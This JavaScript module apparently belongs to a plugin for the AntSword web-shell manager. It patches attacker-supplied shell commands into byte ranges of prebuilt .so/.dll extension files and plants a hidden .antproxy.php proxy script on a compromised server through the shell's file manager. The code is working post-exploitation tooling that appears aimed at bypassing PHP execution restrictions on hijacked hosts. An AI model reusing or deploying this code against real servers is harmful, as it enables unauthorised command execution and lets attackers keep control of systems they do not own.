'use strict';

const fs = require('fs');
const {ProxyScript} = require('../payload');
const LANG = require('../language'); // 插件语言库
const LANG_T = antSword['language']['toastr']; // 通用通知提示

class Base {
/**
   * 初始化
   * @param  {Object} cell dhtmlx.cell对象
   * @param  {Object} top  顶层对象
   * @return {Object}      this
   */
  constructor(cell, top) {
    var self = this;
    this.cell = cell;
    this.top = top;
    self.isOpenBasedir = (Object.keys(self.top.infodata.open_basedir).length > 0);
    self.ext_name = `ant_x${self.top.infodata.arch}.${self.top.infodata.os.toLowerCase() === "linux" ? "so": "dll"}`;
    self.ext_path = path.join(__dirname, `../ext/ant_x${self.top.infodata.arch}.${self.top.infodata.os.toLowerCase() === "linux" ? "so": "dll"}`);
  }

  // 生成扩展
  generateExt(cmd) {
    let self = this;
    let fileBuff = fs.readFileSync(self.ext_path);
    let start = 0, end = 0;
    switch (self.ext_name) {
      case 'ant_x86.so':
        start = 275;
        end = 504;
        break;
      case 'ant_x64.so':
        // 434-665
        start = 434;
        end = 665;
        break;
      case 'ant_x86.dll':
        start = 1544;
        end = 1683;
        break;
      case 'ant_x64.dll':
        start = 1552;
        end = 1691;
        break;
      default:
      break;
    }
    if(cmd.length > (end - start)) {
      return
    }
    fileBuff[end] = 0;
    fileBuff.write("                    ", start);
    fileBuff.write(cmd, start);
    return fileBuff;
  }

  // 上传代理脚本
  uploadProxyScript(host="127.0.0.1", port=61111) {
    const PROXY_LANG = LANG['core']['base']['proxyscript'];
    let self = this;
    self.top.core.request(
      self.top.core.filemanager.create_file({
        path: `${self.top.infodata.phpself}/.antproxy.php`,
        content: ProxyScript(`http://${host}:${port}/${self.top.infodata.shell_name}`),
      })
    ).then((res)=>{
      let ret = res['text'];
      if (ret === '1') {
        toastr.success(PROXY_LANG['success'](`${self.top.infodata.phpself}/.antproxy.php`), LANG_T['success']);
      }else{
        toastr.error(PROXY_LANG['fail'], LANG_T['error']);
      }
    }).catch((err)=>{
      toastr.error(`${LANG['error']}: ${JSON.stringify(err)}`, LANG_T['error']);
    });
  }
}
module.exports = Base;